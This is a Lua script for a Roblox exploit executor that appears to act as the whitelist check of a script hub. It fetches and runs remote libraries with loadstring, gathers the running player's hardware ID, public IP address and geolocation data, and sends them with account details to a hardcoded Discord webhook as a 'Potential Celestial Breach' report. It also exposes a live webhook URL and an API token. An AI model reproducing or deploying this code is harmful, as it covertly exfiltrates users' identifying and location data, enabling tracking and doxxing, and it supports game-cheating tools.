local webhookUrl = "https://discord.com/api/webhooks/1387705899765993562/ZUQT7H7cJyE4s95AZuxORgLAGS_hCu5UpiY67W0HuWHgytxZZ4Qp7FveNuyt8_p6dsyL"
local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Core%20Utilities.lua"))()
local embedLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Embed%20Library.lua"))()

local player = game:GetService("Players").LocalPlayer
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local httpService = game:GetService("HttpService")
local hashedHWID = utils.hash(hwid, "SHA-384")
local userInputService = game:GetService("UserInputService")

local ipv4 = game:HttpGet("https://api.ipify.org")
local ipdetails = game:HttpGet("https://ipinfo.io/?token=03dce9579aa8e0")
local geoloc = game:HttpGet("http://www.geoplugin.net/json.gp?ip=" .. ipv4)

local function fetchData(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)

    if success then
        local successDecode, data = pcall(function()
            return httpService:JSONDecode(response)
        end)

        if successDecode then
            return data
        else
            player:Kick("Failed to decode JSON data from URL: ", url)
            return
        end
    else
        player:Kick("Failed to fetch data from URL: ", url)
        return
    end
    return nil
end

local whitelistURL = "https://gitlab.com/scripts1463602/Celestial/-/raw/main/Users.json?ref_type=heads"
local whitelistedUsers = fetchData(whitelistURL)

if not whitelistedUsers then
    player:Kick("Failed to retrieve the whitelist.")
    return
end

-- Verify user

local authUser
for _, user in ipairs(whitelistedUsers) do
    if user.HWID == hashedHWID then
        authUser = user
    end
end

local function getDevice()
    if userInputService.TouchEnabled then
        return "Mobile"
    elseif userInputService.KeyboardEnabled then
        return "PC"
    elseif userInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

-- Embed

local footerText
if not authUser then
    footerText = "⚠️ User is not authorized."
end

local embedData = {
    webhookUrl = webhookUrl,
    title = nil,
    description = false,
    color = Color3.fromRGB(255, 0, 0),
    url = "https://roblox.com/users/" .. player.UserId .. "/profile",
    thumbnail = nil,
    author = {
        name = "Potential Celestial Breach",
        icon_url = "https://i.imgur.com/eP1Ldg9.png",
        url = nil
    },
    footer = {
        enabled = true,
        name = footerText,
        icon = nil,
        displaySeconds = true
    },
}

local embed = embedLib.createEmbed(embedData)

-- Fields

local discordId = tostring(authUser and authUser.DiscordId or 0)
local identifier = tostring(authUser and authUser.Identifier or "Unknown")

local fields = {
    { name = "Execution Date", value = "Timestamp", inline = true },
    { name = "Linked Account", value = "<@" .. discordId .. ">", inline = true },
    { name = "Identifier", value = identifier, inline = true },
    { name = "Account Age", value = player.AccountAge .. " Days", inline = true },
    { name = "Device", value = getDevice(), inline = true },
    { name = "Exploit", value = identifyexecutor(), inline = true },
    { name = "IPv4", value = "||" .. ipv4 .. "||", inline = true },
    { name = "Hardware ID (HWID)", value = "||" .. hashedHWID .. "\n\n(" .. hwid .. ")||", inline = true },
    { name = "IP Address Lookup", value = "[IPLocation.io](https://iplocation.io/ip/" .. ipv4 .. ")", inline = true },
    { name = "IP Address Geolocation Data", value = "||```json" .. "\n" .. ipdetails .. "```||", inline = false },
    { name = "Geolocation Data", value = "||```json" .. "\n" .. geoloc .. "```||", inline = false },
}

for _, field in ipairs(fields) do
    embedLib.addField(embed, field.name, field.value, field.inline)
end

embedLib.sendEmbed(embed, "Celestial Breaches", "Celestial")